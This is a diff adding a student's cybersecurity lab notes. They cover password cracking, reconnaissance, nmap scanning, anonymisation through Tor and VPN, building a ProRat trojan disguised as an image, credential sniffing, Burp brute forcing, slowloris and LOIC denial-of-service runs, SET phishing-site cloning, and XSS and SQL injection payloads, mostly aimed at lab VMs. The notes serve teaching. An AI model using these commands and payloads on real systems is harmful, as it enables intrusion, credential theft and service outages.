@@ -1,0 +1,623 @@
+1.password cracking
+
+sudo passwd
+adminmsf
+
+crunch 8 8 -p msfadmin > pass.txt
+cat pass.txt  
+head pass.txt
+wc -l pass.txt
+
+ip a
+ping <ip_meta>
+nmap -sV <ip_meta>
+ftp <ip_meta>
+hydra -l msfadmin -P pass.txt -t 4 <ip_meta> ftp
+
+get md5 hash value of msg secret in firefox save the hash id as hash.txt
+cat hash.txt
+hashid <hash>
+john --format=raw-md5 --wordlist=pass.txt hash.txt
+john --show hash.txt
+
+Echo “ text “ > file.txt
+Zip -e <zip_name> <file1> …. <file n>
+zip2john protected.zip > zip_hash.txt
+cd /usr/share/wordlists
+gunzip rockyou.txt.gz
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt 
+john --show zip_hash.txt 
+
+exp2
+Passive reconniasance
+
+sudo apt install whois
+whois www.tce.edu
+or visit https://whois.domaintools.com
+
+https://archive.org/tce.edu 2020 snapshot
+
+netcraft > site report > www.google.com
+for subdomain finding : crt.sh
+To find a website's tech stack : https://builtwith.com/
+
+Google hacking & search Operators:
+
+site:prepinsta.com filetype:pdf
+inurl:admin site:amarsinghcollege.ac.in
+intitle:"index of" site:.edu
+site:prepinsta.com inurl:login 
+site:fda.gov filetype:xls 
+cache:prepinsta.com
+link:prepinsta.com
+site:prepinsta.com filetype:sql
+intitle:"password file" filetype:txt 
+site:prepinsta.com intext:"confidential" 
+site:*.google.com -www
+filetype:bak OR filetype:old OR filetype:backup site:google.com
+intitle:"restricted" site:google.com
+
+Active Reconnaisance:
+host tce.edu
+dig tce.edu
+dig tce.edu NS
+dig tce.edu MX
+dig tce.edu ANY 
+dig tce.edu TXT
+dig tce.edu SPF
+dig tce.edu DKIM
+dnsenum google.com
+dig -x <target_ip(8.8.8.8)>
+
+Use dig or host to attempt a zone transfer: 
+
+dig ns zonetransfer.me
+dig axfr zonetransfer.me @nsztm2.diji.ninja. 
+
+Nmap:
+Host Discovery:
+1. ICMP Echo request:
+    nmap -sn -PE <192.168.56.0/24>
+2. ICMP Timestamp Requests 
+    nmap -sn -PP <192.168.56.0/24>
+3. ICMP Netmask Requests
+    nmap -sn -PM <192.168.56.0/24>
+4. TCP SYN Ping Sweep 
+    nmap -sn -PS21,22,80,443 <192.168.56.0/24> 
+5. UDP Ping Sweep 
+    nmap -sn -PU53,67,161 <192.168.56.0/24>
+    nmap -sn -PS80,443 -PU53,161 <192.168.56.0/24>  
+6. Broadcast ICMP Address:
+   sudo ping -b 192.168.1.255
+
+Disabling reverse DNS lookup 
+nmap -n -sn <192.168.56.0/24> 
+
+Port Scanning:
+
+1.TCP Connect Scan    nmap -sT <192.168.56.101>
+2. SYN Scan  nmap -sS 192.168.56.101 (half open scan)
+3. Stealth scan nmap -sS -f 192.168.56.101 (-sF -sX -sN)
+4. Decoy Scan nmap -sS -D RND:5 192.168.56.101 
+5. FTP Bounce Scan nmap -b msfadmin:msfadmin@192.168.56.101(meta_ip) 192.168.56.102(kali ip)
+6. Aggressive Scan nmap -A 192.168.56.101 
+
+Service Version Detection
+nmap -sV 192.168.56.101
+
+OS Detection
+nmap -O 192.168.56.101 
+
+Specific port scanning
+nmap -p 21,22,80,443 192.168.56.101 
+
+Exp 4:
+Vulnerability analysis
+
+ls /usr/share/nmap/scripts - lists all scripts available
+
+nmap --script <vul-name> <ip>
+
+Web Application Vulnerabilities: 
+http-Enum Enumerates web directories. 
+http-vuln-cve2017-5638 Checks for Apache Struts CVE-2017-5638.
+http-dombased-xss  Detects DOM-based XSS vulnerabilities.
+http-sql-injection  Attempts to detect SQL injection vulnerabilities. 
+http-shellshock Tests for Shellshock vulnerability in CGI scripts.
+
+SMB / Windows Vulnerabilities: 
+smb-vuln-ms17-010 Tests for EternalBlue vulnerability (WannaCry). 
+smb-os-discovery  Reveals OS details via SMB
+smb-enum-shares  Lists available SMB shares.
+smb-security-mode  Detects insecure SMB configurations. 
+smb-vuln-cve-2017-7494 – Samba remote code execution vulnerability.
+
+FTP Vulnerabilities: 
+ftp-anon  Checks for anonymous FTP login. 
+ftp-vsftpd-backdoor  Detects vsFTPd backdoor.
+ftp-syst Gets FTP server system information.
+ftp-bounce  Checks if FTP server allows bounce scanning. 
+
+Other Service-Level Vulnerabilities: 
+ ssl-enum-ciphers  Lists supported SSL/TLS ciphers and weaknesses. 
+mysql-empty-password – Detects MySQL accounts with no password.
+dns-zone-transfer – Attempts DNS zone transfer.
+telnet-encryption – Checks if Telnet server encrypts traffic.
+vulners – Maps version data to known CVEs via Vulners DB.
+ajp-headers – Detects Apache JServ Protocol vulnerabilities.
+
+Proxy Preparation
+Changing MAC Address using macchanger: 
+Check current MAC address: 
+ifconfig eth0 
+2. Turn off network interface: 
+sudo ifconfig eth0 down 
+3. Change MAC address randomly: 
+sudo macchanger -r eth0 
+4. Turn the interface back on: 
+sudo ifconfig eth0 up 
+5. Verify the new MAC: 
+macchanger -s eth0 
+
+Using VPN for IP Anonymization (e.g., OpenVPN):
+sudo apt install openvpn 
+Download .ovpn - ca196
+uname : vpnbook
+passwd : 54ac423
+
+curl ipinfo.io/ip
+
+cd downloads
+ls
+cd vpnbook-openvpn-ca196
+ls
+sudo openvpn vpnbook-ca196-udp25000.ovpn 
+
+curl ipinfo.io/ip
+whatismyip.com website : before and after vpn
+
+ip route
+sudo nmap -e tun2 --packet-trace tce.edu
+
+Open wireshark > choose tunnel 2 as interface and capture packets and analyze
+
+Using ProxyChains for anonymized scanning: 
+
+sudo apt install tor proxychains
+sudo service tor start 
+sudo nano /etc/proxychains.conf 
+Ensure this line is present at the end: 
+socks4 127.0.0.1 9050 
+proxychains nmap -sT -Pn 192.168.56.106<metaip> 
+proxychains curl https://www.pinterest.com
+
+User Enumeration
+enum4linux -a 192.168.56.101 
+enum4linux -u  -p 192.168.56.106
+
+rpcclient -U ' ' 192.168.56.101
+ enumdomusers
+queryuser 0x4be 
+getdompinfo
+
+FTP Misconfigurations: 
+ftp 192.168.56.101 
+ls
+get <filename>
+put <filename>
+
+Exp 5:
+Windows 7: 
+VM : https://archive.org/details/Windows7-iso 
+
+Anivirus detection test:
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* 
+
+save as .eicar.com
+
+Code – Turn Off Internet: 
+@echo off 
+ipconfig /release 
+
+Code - Turn On Internet: 
+@echo off 
+ipconfig /renew
+
+Save as .bat file both two
+Open cmd before and after running bat files and type ipconfig
+
+
+Popup(popup.vbs)
+X=MsgBox("Your text here", 0+64, "Title")
+
+Popup loop:
+do 
+X=MsgBox("Virus Spreading", 0+48, "Virus Warning") 
+loop
+
+Prorat:
+1. Attacker VM 
+OS: Windows 7 
+Windows 7 Internet Explorer Configuration: 
+Issue: Internet Explorer in Windows 7 VM doesn't load websites due to outdated TLS settings. 
+Solution - Enable TLS 1.2 in Internet Explorer: 
+1. Open Internet Options (Control Panel → Internet Options, or from IE: Tools → Internet Options) 
+2. Go to Advanced → Security tab -> Scroll down to Security section -> Tick Use TLS 1.1,Tick Use TLS 1.2 
+3. Click Apply → OK 
+4. Restart Internet Explorer 
+5. Test by opening https://www.google.com .  Websites now load properly in Windows 7 IE 
+
+Disable antivirus temporarily (only on attacker VM, not on host) 
+Disable Windows Defender: 
+1. Open Control Panel → System and Security 
+2. Click Windows Defender 
+3. Go to Settings → Real-time protection 
+4. Uncheck Turn on real-time protection 
+5. Click Save changes 
+
+Disable Windows Firewall: 
+1. Open Control Panel → System and Security 
+2. Click Windows Firewall 
+3. Select Turn Windows Firewall on or off 
+4. Check Turn off Windows Firewall for:  
+o Private network settings 
+o Public network settings 
+5. Click OK
+
+ Install ProRat (educational copy in lab repository) 
+Visit  https://prorat.software.informer.com/download/  and download the file and extract.
+
+Open ProRat on the attacker VM and Click Create → Create ProRat Server. 
+Enter the attacker VM’s IP address.
+Choose port 5110 (default) or any unused port. 
+Select options such as Show Message on Infection to simulate social engineering.
+Bind the server with a file → for example, an image  ile. (This is done to make the malicious server file 
+appear harmless, tricking the victim into opening it.)
+Choose a server icon to make the file look more legitimate. 
+Save the server file and click Finish.
+
+Create a Shared Folder on Host (Normal System) 
+ Shut down both the attacker and victim VMs. Create a folder in host system. 
+ Open VM Settings → Shared Folders. 
+ Create a new shared folder, choose the path on the host machine, and check Auto-mount for both VMs. 
+
+Create a Shared Folder on Host (Normal System) 
+ Shut down both the attacker and victim VMs. Create a folder in host system. 
+ Open VM Settings → Shared Folders. 
+ Create a new shared folder, choose the path on the host machine, and check Auto-mount for both VMs. 
+ Restart the VM after installation. 
+3. Enable Network Discovery (Windows VMs) 
+ Go to Control Panel → Network and Sharing Center → Advanced sharing settings. 
+ Turn on Network Discovery. 
+ After this, the VBoxSvr network will be visible. 
+
+ On the attacker VM, copy the generated malicious server file into the VBoxSvr shared network folder. 
+ On the victim VM, open the VBoxSvr shared network. 
+ Copy the server file from the shared folder and paste it into a local directory
+
+Run the file on the victim VM.
+ On attacker VM, open ProRat and connect to the victim’s IP & port.
+
+do the operations
+
+On victim VM, run: 
+9. netstat -ano to see active connections.
+Task Manager to identify suspicious processes.
+wireshark => filter : tcp.port==5110 
+
+Exp 6:
+
+pip install stegano
+
+from stegano import lsb 
+secret = lsb.hide("cover.png", "Treasure is hidden in TCE Main Office") 
+secret.save("stego.png") 
+print(f"Secret Message embedded and saved as stego.png") 
+revealed = lsb.reveal("stego.png") 
+print("Extracted secret: ", revealed) 
+
+sudo apt install python3 python3-pip
+pip3 install stegano
+pip3 install Pillow
+
+Code: 
+pip install Pillow
+
+from PIL import Image 
+ 
+# --------- LSB Embedding --------- 
+def lsb_embed(cover_image_path, secret_message, stego_image_path): 
+    img = Image.open(cover_image_path) 
+    binary_msg = ''.join(format(ord(c), '08b') for c in secret_message) + '11111110' 
+    data = iter(img.getdata()) 
+    new_pixels = [] 
+    msg_index = 0 
+ 
+    for pixel in data: 
+        r, g, b = pixel[:3] 
+        if msg_index < len(binary_msg): 
+            r = (r & ~1) | int(binary_msg[msg_index]) 
+            msg_index += 1 
+        if msg_index < len(binary_msg): 
+            g = (g & ~1) | int(binary_msg[msg_index]) 
+            msg_index += 1 
+        if msg_index < len(binary_msg): 
+            b = (b & ~1) | int(binary_msg[msg_index]) 
+            msg_index += 1 
+        new_pixels.append((r, g, b)) 
+        if msg_index >= len(binary_msg): 
+            new_pixels.extend(data) 
+            break 
+ 
+    stego_img = Image.new(img.mode, img.size) 
+    stego_img.putdata(new_pixels) 
+    stego_img.save(stego_image_path) 
+    print(f"Secret Message embedded and saved as {stego_image_path}") 
+# --------- LSB Extraction --------- 
+def lsb_extract(stego_image_path): 
+    img = Image.open(stego_image_path) 
+    binary_data = "" 
+    for pixel in img.getdata(): 
+        r, g, b = pixel[:3] 
+        binary_data += str(r & 1) 
+        binary_data += str(g & 1) 
+        binary_data += str(b & 1) 
+ 
+    secret_bits = [binary_data[i:i+8] for i in range(0, len(binary_data), 8)] 
+    secret_message = "" 
+    for byte in secret_bits: 
+        if byte == '11111110':  # Stop at marker 
+            break 
+        secret_message += chr(int(byte, 2)) 
+ 
+    print(f"Extracted secret: {secret_message}") 
+    return secret_message 
+ 
+ 
+# --------- Main Program --------- 
+if __name__ == "__main__": 
+    choice = input("Enter 1 for Embedding or 2 for Extraction: ") 
+ 
+    if choice == "1": 
+        cover = input("Enter cover image filename: ") 
+        message = input("Enter secret message: ") 
+        stego = input("Enter output stego image filename: ") 
+        lsb_embed(cover, message, stego) 
+ 
+    elif choice == "2": 
+        stego = input("Enter stego image filename: ") 
+        lsb_extract(stego) 
+ 
+    else: 
+        print("Invalid choice")
+
+Exp 7:
+
+password sniffing:
+
+Sudo msfconsole 
+use auxiliary/sniffer/psnuffle 
+set INTERFACE eth0 
+run 
+
+run ftp <metaip> om other terminal
+capture wireshark traffic by usinf filter ftp
+
+BurpSuite:
+EX NO 7
+Both the VM Kali and Metasploitable to be connected in Bridged Adapter Network
+Password Capture using Wireshark
+o	In kali, open wireshark
+o	Start packet capturing on Wireshark (select active interface) in kali linux
+o	Open Kali Linux terminal.
+cmd => ftp <meta-ip>
+Provide username and password of msfadmin
+Name : msfadmin
+Password: msfadmin
+ 
+o	In Wireshark, filter packets with:ftp and observe credentials in USER and PASS commands.
+
+Sniffing using Burpsuite
+Firefox Configuration:
+	Open Firefox settings and go to Preferences > Network Settings.
+	Select Manual proxy configuration and set:
+	HTTP Proxy: 127.0.0.1
+	Port: 8080
+	Check Use this proxy server for all protocols and save the settings.
+
+Proxy Module
+1) Intercept: Capture browser requests.
+1)	Open firefox in kali and browse : http://<meta ip>
+Output will be: 
+_ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+Contact: msfdev[at]metasploit.com
+Login with msfadmin/msfadmin to get started
+
+2)	In Burp go to Proxy → Intercept tab → click Intercept is on to enable.
+3)	Browse a website in firefox like : http://httpbin.org/get
+4)	Intercepted HTTP requests appear in the Intercept tab. By right clicking any one of the request displayed in the intercept tab,  you can view/modify/forward/drop them.
+
+2)HTTP History: Review all recorded requests and responses.
+1) In Burp: go to Proxy → HTTP history (tab).
+2) You’ll see a table of recorded requests. Columns include: Method, Host, URL, Status, MIME type, Length, Comment.
+3) Click any row to open the detail pane below (or to the right) showing:
+•	Left pane: Request (Raw / Params / Headers / Body).
+•	Right pane: Response (Raw / Headers / Body / Render).
+4)Use the Filter box (top of the table) to narrow by host, method, status, MIME type, or text.
+5)	Right click a request to Send to Repeater, Save selected items, Copy URL, Show in site map, or Add comment/Tag.
+
+Target Module
+Important: (Turn off he intercept)
+•	Site Map: Explore the discovered structure of the application.
+1)	In Burp: click Target (top menu).
+2)	Select Site map (left pane under Target).
+3)	You’ll see a tree of hosts on the left and directories/paths on the right.
+(upto this step enough)
+4)	Click any request row to view details in the lower pane: Request and Response tabs (Raw, Headers, Params).
+5)	 Right click a request in the Site map to get useful actions:
+•	Open in browser — open that URL in your browser (useful to reproduce).
+•	Show in proxy / Show in scanner — jump to that tool’s view.
+•	Send to Repeater / Send to Intruder / Copy URL etc.
+•	Exclude from scope or Include in scope (quick toggles).
+
+•	Scope: Define in-scope URLs for testing.
+1)	Right click a request in the Site map > choose add to scope
+2)	In Burp: click Target → Scope (tab under Target).
+3)	This view lists current in scope items and scope rules.
+Repeater Module
+•	Request Modification: Edit HTTP requests (headers/parameters).
+•	Response Analysis: Resend and study modified requests.
+1)	Go to firebox and browse : http://<meta ip> /dvwa/login.php
+2)	In Burp: Proxy → Intercept → Intercept is on.
+3)	In the browser, where you have opened previously – login with credentials (http://<meta ip> /dvwa/login.php)  . HTTP request will pause and appear in Burp’s Proxy > Intercept window.
+4)	 Review the request. Right click the request and choose Send to Repeater (or click the “Action → Send to Repeater” control).
+5)	Switch to Repeater tab. There you’ll see the request in the left pane and the server response (after you send) in the right pane.
+6)	Edit the request in the left pane. You can edit:
+•	Request line (method, path, HTTP version): e.g., change GET /page to POST /page if appropriate.
+•	Headers: modify User-Agent, Referer, Cookie, etc.
+•	Query parameters: change ?id=1 → ?id=2.
+•	Body (for POST): change form parameters (e.g., username=alice&password=test).
+7)	After editing, click Go (top right of Repeater) to send the modified request to the target. The response appears on the right. –
+If Go option not available click send button on the top right – the response appear down
+8)	Then go to the login page login with the changed password.
+
+
+
+
+
+Intruder Module
+•	Attack Types: Choose Sniper, Battering Ram, Pitchfork, or Cluster Bomb.
+•	Payload Positions: Mark fields for testing (e.g., username/password).
+•	Payload Sets: Load wordlists.
+•	Options: Configure attack speed and matching.
+•	Results: Detect valid login credentials.
+
+o	sudo service apache2 start
+
+o	sudo service mysql start
+ 
+o	Verify the application is accessible by opening a browser and navigating to http://<victim-ip>/dvwa.
+o	Open Burp Suite and go to the Proxy tab.
+o	In the Proxy > Intercept tab, turn the intercept on.
+	Open Firefox settings and go to Preferences > Network Settings.
+	Select Manual proxy configuration and set:
+	HTTP Proxy: 127.0.0.1
+	Port: 8080
+	Check Use this proxy server for all protocols and save the settings.
+o	In your browser, try to log in to DVWA with incorrect credentials. Burp Suite will intercept this request.
+o	Right-click the intercepted request which is in Intercept tab and choose Send to Intruder.
+o	In Burp Suite, go to the Intruder tab. You'll see the intercepted login request listed.
+o	In the Positions tab, you'll see the captured POST request from the login form.
+o	Mark the username and password fields as payload positions by selecting them and clicking Add §.
+o	In the Payloads tab(after clicking Add I will be in right side), click Load and select a wordlist from your Kali Linux system.
+o	Go to kali terminal 
+o	cmd=> cd /usr/share/wordlists
+o	cmd=> sudo gunzip rockyou.txt.gz
+o	cmd=> ls -lh rockyou.txt
+o	After running these commands when you click load in payloads tab – browse location /usr/share/wordlists here select rockyou.txt file
+•	Choose any attack(Sniper, Battering Ram, Pitchfork, or Cluster Bomb) Click Start Attack in Burp Suite. The Intruder module will begin testing the payloads against the login form.
+o	A valid login attempt might show a different HTTP status (e.g., 200 OK with a welcome message) compared to invalid ones (e.g., 403 or 401).
+
+Password Cracking Activity:
+1.	Capture a login request from Proxy.
+1.	Open a browser and navigate to http://<victim-ip>/dvwa (make sure intercept off)
+1.	In Burp Suite:
+o	Go to Proxy > Intercept → Make sure Intercept is ON.
+2.	In the DVWA page on Kali’s browser, go to Login Page.
+3.	Try logging in with dummy credentials:
+o	Username: admin
+o	Password: 123456
+
+4.	Right-click the intercepted request which is in Intercept tab and choose Send to Intruder.
+5.	In Burp Suite, go to the Intruder tab. You'll see the intercepted login request listed.
+6.	Clear All positions.
+7.	Highlight only the password field value (e.g., password=123456) and click Add §.
+8.	Go to the Payloads tab.
+9.	Under Payload Set 1, click Load.
+10.	Navigate to the Kali default wordlist:
+11.	/usr/share/wordlists/rockyou.txt.gz
+12.	If it’s compressed, decompress it first:
+Go to kali terminal 
+o	cmd=> cd /usr/share/wordlists
+o	cmd=> sudo gunzip rockyou.txt.gz
+o	cmd=> ls -lh rockyou.txt
+13.	Attack type: Choose Sniper (for single field) or Cluster Bomb (for username + password combo).
+14.	Click start attack
+15.	Identify correct credentials by response length/status.
+16.	If status code 302 wrong password, if 200 correct password
+
+
+Exp 8:
+nmap -p 80 <ip>
+nmap --script http-slowloris-check -p 80 <ip>
+nmap -p 80 --script http-slowloris --max-parallelism 400 --script-args "http-slowloris.send_interval=200,http-slowloris.timelimit=600" <ip>
+
+perl script:
+wget https://raw.githubusercontent.com/mattiasgeniar/slowloris/master/slowloris.pl
+chmod +x slowloris.pl
+perl slowloris.pl -dns <ip> -port 80 -num 500 -timeout 30
+
+netstat -an | grep :80 | wc -l
+
+Low orbit Ion Cannon:
+sudo apt-get install git mono-devel -y
+git clone https://github.com/NewEraCracker/LOIC.git
+cd LOIC
+./loic.sh install
+./loic.sh run
+TCP,UDP,HTTP attack
+htop cmd in metasploitable
+
+RUDY:
+sudo apt install golang -y
+git clone https://github.com/darkweak/rudy.git
+cd rudy
+go version
+go build -o rudy rudy.go
+./rudy run -u http://testphp.vulnweb.com/login.php -c 10 -p 10000 -i 10s
+
+Exp 9:
+
+website clone
+sudo -i
+setoolkit
+1) Social-Engineering Attacks
+2) Website Attack Vectors
+3) Credential Harvester Attack Method 
+4) Site Cloner 
+ Enter the IP address of the attacker’s machine (Kali). 
+Enter the URL of a target website to clone (e.g., http://www.facebook.com).
+Open firefox type <kali_ip> and login dummy credentials
+It will be diaplyed in terminal
+
+Reflected XSS:
+LOw
+<script>alert('XSS Successful!')</script> 
+ <script>alert(document.cookie)</script>
+
+Medium:
+<scr<script>ipt>alert("Your system has been hacked by Launching Relected XSS")</script>
+
+2. Stored XSS:
+LOW:
+<script>alert("You have been hacked")</script>
+Medium:
+Inspect
+<scr<script>ipt>alert("Your system has been hacked by Sarvani")</script>
+
+SQL Injection:
+
+1' OR '1'='1 -- 
+1' UNION SELECT null, version() --  
+1' UNION SELECT null, @@hostname;#
+ ' union select 1,2;#
+ 1' UNION SELECT schema_name, NULL FROM information_schema.schemata --
+1' and 1=1 union select null,table_name from information_schema.tables# 
